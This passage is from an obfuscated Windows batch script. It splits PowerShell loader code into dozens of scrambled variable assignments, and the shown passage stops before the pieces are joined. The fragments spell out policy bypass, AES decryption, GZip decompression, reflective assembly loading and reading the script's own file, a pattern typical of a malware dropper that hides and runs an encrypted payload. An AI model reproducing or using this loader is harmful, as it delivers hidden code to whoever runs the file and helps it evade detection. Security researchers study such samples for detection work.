@echo off
set "FkodWlxJlG=bypa"
set "bNsKYWAzjD=BZI."
set "dTjYYtCDls=CaJ."
set "YIhmUYnCqw=ct S"
set "DcCOuoSfUV=[IO."
set "imGNnBOHVb= '')"
set "bKOeHJHMbT= = N"
set "bNJvxgDHQS=Op, "
set "YbVTBHlxFH=.GZi"
set "chSPhlBQer=; };"
set "nJmXtckOpS=oArr"
set "iJRQKraApR=PKCS"
set "ZtDlbGtUVL=ring"
set "odHPKbGyLH=).Sp"
set "chpPyXZHfP=] -j"
set "ENwmZUmkVP=-joi"
set "BhatCGBXdV=raph"
set "NzRjhMnBth=[]] "
set "QeSQyLgvDJ=isfL"
set "yUfJsYFhta== $b"
set "vimuvluClY=-1.."
set "CeIwilhYlB=();$"
set "cKpRDgFavA=-nop"
set "ptMwLHMBVm=rity"
set "jvMiUsTNpO=comp"
set "eyGCfUPaZW=saBm"
set "oeMbUvGsXX=ionM"
set "fSAvxRoOVU=File"
set "detatEjUdJ=New-"
set "xVsZmmnRtx=FZbw"
set "kTMjydaEJw=ZYYc"
set "SFrkAZbcDI=ateD"
set "UfAoQZPWEt=trea"
set "pdaqrEnGnc=oint"
set "oPzTQShLZK=ach "
set "gwdgdWIHzX=Y.Pa"
set "nHfmEawefU=();$"
set "WPBNOadLBd=aJ.T"
set "oyADHxjBEf==');"
set "tFywSUrzBZ=]::("
set "GkgzPCjoSh=stem"
set "AGUHmazLMf=join"
set "PjFfaItaBO=xKhs"
set "xtdagLcVEV=$rWC"
set "pGQfeimabh=gth)"
set "PlBaJfONet=.-16"
set "hmwkcqyRsq=yste"
set "iAknoXKVwI=7;$b"
set "fGvvdxIYUZ=($sP"
set "PjgBunVAWK=)($g"
set "trMWZhwzbF=pStr"
set "zIDWEppnmg=ert]"
set "McXyIKkURm=6] -"
set "LakPkExllv=flec"
set "xDpJAFtiNf=am;$"
set "CERIFryhde=+hAO"
set "lKgtIYlrAt=.Key"
set "jYUJWhOHTU=SVl."
set "VaFDDFyUWW=FZbw"
set "FEZUkwqoec=n ''"
set "hasztZJMtt=.Mod"
set "VAsIADXTik=($sP"
set "muHMOOURxU=GoEv"
set "AWulkzZGZp=yste"
set "oNbmJkGpUc=g = "
set "NeOGSzMFaG=embl"
set "Uhjqulalyj=ASVl"
set "EjTbpLVTHf=lit("
set "lDrkiENtMg=Syst"
set "QLHfLGHrLW=GV.T"
set "KovJvAfFxp=t Sy"
set "WMQQkReKIJ=Disp"
set "tbKQtvaIHM=:: '"
set "vmDXdNApGw=();$"
set "jzuJNtOyko=tem."
set "AdxQkWslks=p = "
set "VCZPRdZAVe=3HWs"
set "TsMDwpLJfU=$VmH"
set "CHSiJHLKIC=ewLi"
set "oGNXRXPfIz=Obje"
set "iWKGlkvmCX=ss -"
set "OlAjGAqhJe=New-"
set "QtUPZwUkRe=hy.A"
set "kiylXCNLel=esFX"
set "mQcAAzDPFB=.IO."
set "qzwHHEJUPN=.Sec"
set "xMbpesohYJ=form"
set "TZlbtqjruk=null"
set "kUJeZFlyAc=);$b"
set "ovtYnqQMGr=daeR"
set "NZIaMSRtCU=Stre"
set "PedBSyaOTK=('%~f0'"
